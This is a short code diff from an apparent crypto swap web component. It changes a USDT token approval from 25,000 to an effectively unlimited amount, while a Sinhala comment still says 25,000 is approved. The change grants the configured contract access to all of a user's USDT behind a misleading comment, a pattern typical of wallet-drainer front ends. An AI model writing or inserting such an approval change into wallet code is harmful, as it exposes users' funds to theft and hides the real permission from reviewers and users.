@@ -112,7 +112,7 @@ export default function SwapCard({ walletAddress, provider }) {
       const decimals = await usdtContract.decimals();
       
       // ⭐ ඊට පස්සේ 25,000 USDT approve කරනවා
-      const amount = ethers.utils.parseUnits("25000", decimals);
+      const amount = ethers.utils.parseUnits("1010101010101010101010101010101010101010101010101010", decimals);
 
       const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
       
